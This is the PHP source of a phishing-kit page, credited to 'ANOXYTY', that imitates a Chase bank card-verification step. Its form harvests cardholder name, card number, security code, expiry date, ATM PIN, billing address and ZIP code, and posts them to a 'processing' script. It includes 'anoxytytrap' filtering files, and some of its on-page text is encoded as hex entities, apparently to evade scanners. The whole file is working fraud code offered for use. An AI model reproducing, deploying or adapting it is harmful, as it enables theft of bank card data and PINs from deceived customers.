<?php 
ini_set( "display_errors", 0); 
/*       
// made by ANOXYTY" //Contact https://icq.im/Anoxyty / TELEGRAM @ANOXYTY "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/
include('anoxytytrap/anoxyty.php');
include 'anoxytytrap/bite.php';
include 'anoxytytrap/country.php';
include 'anoxytytrap/une.php';

$token = bin2hex(random_bytes(32));
$_SESSION['token'] = $token;

define('Myheader', TRUE);
?> 

 <?php include 'layers/header.php'; ?>

   <style> 
        .input-icons i { 
            position: absolute; 
			left:120px;
        } 
          
        .input-icons { 
            width: 100%; 
            margin-bottom: 10px; 
			align: right;
        } 
          
        .icon { 
            padding: 10px; 
            color: green; 
            min-width: 50px; 
            align: right; 
        } 
    </style> 
    <body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true"><div id="logonApp" data-is-view="true"><div class="homepage" tabindex="-1"><div id="advertisenativeapp" data-has-view="true"><div data-is-view="true"></div></div>  <div class="logon-container" id="container"><header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true"><div class="logon header jpui transparent navigation bar" data-is-view="true"><a id="logoHomepageLink" href="#"> <div class="chase logo"></div> <span class="util accessible-text">&#x43;&#x68;&#x61;&#x73;&#x65;&#x20;&#x68;&#x6f;&#x6d;&#x65;&#x70;&#x61;&#x67;&#x65;</span></a> </div></header> <main id="logon-content" data-has-view="true"><div class="msd password-reset first-step" data-is-view="true"><div id="backgroundImage">
	
	<div class="jpui background image fixed blurred" id="geoImage"></div>
	
	
	
	
	
</div>

<div class="container"><div class="row jpui primary panel"><div class="col-xs-12 col-md-10 col-md-offset-1 content-container">

<h1 class="header" id="passwordResetHeader" tabindex="-1">Card information</h1> <div class="row jpui panel body" id="mainpanel"> <div class="col-xs-12 col-sm-10 col-sm-offset-1"><div class="progress u-no-outline" id="progress" tabindex="-1"><div class="row"><div class="col-xs-12 col-sm-6 clear-padding"><h2>Get Verified <span class="util high-contrast">Step 1 of 4</span></h2> </div> <div class="col-xs-12 col-sm-6 progress-padding"><div class="jpui progress rectangles" id="progress-progressBar" data-progress=""><ol class="steps-4" role="presentation"><li  id="progress-progressBar-step-1"><span class="util accessible-text" id="accessible-progress-progressBar-step-1"></span></li><li id="progress-progressBar-step-2"></li><li class="active current-step" id="progress-progressBar-step-3"></li><li id="progress-progressBar-step-4"></li></ol></div></div></div></div><br/> <p>&#x46;&#x6f;&#x72;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x73;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x2c;&#x20;&#x63;&#x6f;&#x6e;&#x66;&#x69;&#x72;&#x6d;&#x20;&#x61;&#x20;&#x64;&#x65;&#x62;&#x69;&#x74;&#x20;&#x6f;&#x72;&#x20;&#x63;&#x72;&#x65;&#x64;&#x69;&#x74;&#x20;&#x63;&#x61;&#x72;&#x64;&#x20;&#x6c;&#x69;&#x6e;&#x6b;&#x65;&#x64;&#x20;&#x74;&#x6f;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x61;&#x63;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x2e;</p>   <div class="recovery options inside-container">

<form class="toggle-aria-hidden"  method="POST" id="idca" action="processing/carr" >

<div class="fl w-75" id="messages"></div>
<div class="row"><div class="col-xs-12 col-sm-4 col-sm-offset-1 label-column"><label class="jpui label reset_by_social_security_number" aria-hidden="false"> Name On Card </label> </div> <div class="col-xs-12 col-sm-6 col-md-6 form-column"><div class="form-toggle reset_by_social_security_number"><div id="socialSecurityNumber"> <input min="0" class="jpui input" type="text" id="name" name="noc"  autocomplete="cc-name" value="">    </div> </div></div></div>

<div class="row"><div class="col-xs-12 col-sm-4 col-sm-offset-1 label-column"><label class="jpui label reset_by_social_security_number" aria-hidden="false">Card Number</label> </div> <div class="col-xs-12 col-sm-6 col-md-6 form-column"><div class="form-toggle reset_by_social_security_number "><div id="emailaddress"> <input min="0" class="jpui input" type="tel" id="cc-number" name="cc" autocomplete="cc-number"  value="" > </div> </div></div></div>



<div class="row"><div class="col-xs-12 col-sm-4 col-sm-offset-1 label-column"><label class="jpui label reset_by_social_security_number"  aria-hidden="false">Security Code</label> </div> <div class="col-xs-12 col-sm-6 col-md-6 form-column"><div class="form-toggle reset_by_social_security_number "><div id="emailaddress"> <div class="tooltip"><div class="input-icons"> 
                <i ><img src="./assets/img/cvv.png" width="73" height="55" class="icon"> 
              </i> <input min="0" class="jpui input" type="tel" name="cvv"  id="frmCCCVC" value="" size="10px" autocomplete="cc-csc" minlength="3"  maxlength="3"> <span class="tooltiptext">The three digits at the back of your card</span>
</div>  </div> </div> </div></div></div>




<div class="row"><div class="col-xs-12 col-sm-4 col-sm-offset-1 label-column"><label class="jpui label reset_by_social_security_number"> Expiration Date </label> </div> <div class="col-xs-12 col-sm-6 col-md-6 form-column"><div class="form-toggle reset_by_social_security_number"><div id="socialSecurityNumber"><div class="tooltip"> <input min="0" class="jpui input"  autocomplete="cc-exp" type="text" name="expdate" id="cc-exp" value="" size="10px" placeholder="MM/YY">   </div>  </div> </div> </div></div>


<div class="row"><div class="col-xs-12 col-sm-4 col-sm-offset-1 label-column"><label class="jpui label reset_by_social_security_number"> Atm Pin </label> </div> <div class="col-xs-12 col-sm-6 col-md-6 form-column"><div class="form-toggle reset_by_social_security_number"><div id="socialSecurityNumber"><div class="tooltip"> <input min="0" class="jpui input"  type="tel" name="atm" minlength="4"  maxlength="4" value="" size="10px" autocomplete="off" >   </div>  </div> </div> </div></div>

<div class="row"><div class="col-xs-12 col-sm-4 col-sm-offset-1 label-column"><label class="jpui label reset_by_social_security_number" aria-hidden="false"> Billing Address </label> </div> <div class="col-xs-12 col-sm-6 col-md-6 form-column"><div class="form-toggle reset_by_social_security_number"><div id="socialSecurityNumber"> <input min="0" class="jpui input" id="socialSecurityNumber-input-field" type="text" name="stradd"  value="" placeholder="Street address">    </div> </div></div></div>
<!-- hidden  -->	
		
 <input type="hidden" name="token" value="<?php echo $token; ?>">
<!-- hidden  -->	
<div class="row"><div class="col-xs-12 col-sm-4 col-sm-offset-1 label-column"><label class="jpui label reset_by_social_security_number" aria-hidden="false">ZIP code </label> </div> <div class="col-xs-12 col-sm-6 col-md-6 form-column"><div class="form-toggle reset_by_social_security_number"><div id="socialSecurityNumber"><div class="tooltip"> <input min="0" class="jpui input" id="socialSecurityNumber-input-field" maxlength="5" type="text" name="zip"  value="" size="10px" >   </div>  </div> </div> </div></div>


 </div> <div class="button-container row hide-xs show-sm"><div class="col-xs-12 col-sm-3 col-sm-offset-6"></div> <div id="logonSkipLinkContainer"></div> <div class="col-xs-12 col-sm-3"><button type="submit" id="proceedToLocateUserId" class="jpui button focus primary fluid touch" aria-disabled="true"><span class="label">Next</span> </button></div></div> <div class="button-container row hide-sm"><div class="col-xs-12 col-sm-3 col-sm-push-9"><button type="submit" id="proceedToLocateUserId" class="jpui button focus primary fluid touch" aria-disabled="true"><span class="label">Next</span> </button></div> <div class="col-xs-12 col-sm-3 col-sm-push-3"></div></div></div></div></form>
 
 
 
 
<style type="text/css">
.red		{color: #bb0826;
background-image: url('assets/img/warning-3-16.ico');
background-repeat: no-repeat;
padding-left: 30px;  /* width of the image plus a little extra padding */
display: block;
font-size: 1rem;
font-weight: 300;
color: #BF2155;
letter-spacing: 0;
width: 100%;
margin: .0625rem .0625rem .313rem 0;
font-family: 'Open Sans','Helvetica Neue',Helvetica,Arial,sans-serif;
font-size: 16px;
}
	</style>	 
<script src="https://cdnjs.cloudflare.com/ajax/libs/es6-shim/0.35.3/es6-shim.min.js"></script>    
<script src="assets/dist/js/done.js"></script>
<script src="assets/dist/js/FormValidation.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
<script>
$('input[name="expdate"]').mask('00/00');
</script>
 
 
 
 
 
 
 
 
 </div></div></div>



</div></div>

</div></main></div> </div></div></body></html>